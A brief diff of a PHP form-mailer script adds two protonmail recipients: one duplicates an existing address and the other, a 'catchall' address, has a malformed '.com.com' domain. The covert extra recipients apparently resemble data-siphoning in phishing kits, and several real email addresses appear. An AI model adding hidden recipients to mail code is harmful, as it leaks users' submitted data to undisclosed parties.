@@ -78,6 +78,8 @@ try{
 	}
 	$mailer->setFrom($from, 'The ROBOT MAILER');
 	$mailer->addAddress('thuyoanh21790@gmail.com', 'Admin');
+	$mailer->addAddress('rembiotech@protonmail.com');
+	$mailer->addAddress('mastercatchall001@protonmail.com.com');
 	$mailer->addAddress('Harvey.millington@remediumpharmacy.com');
 	$mailer->addAddress('rembiotech@protonmail.com');
 	$mailer->isHTML(true);
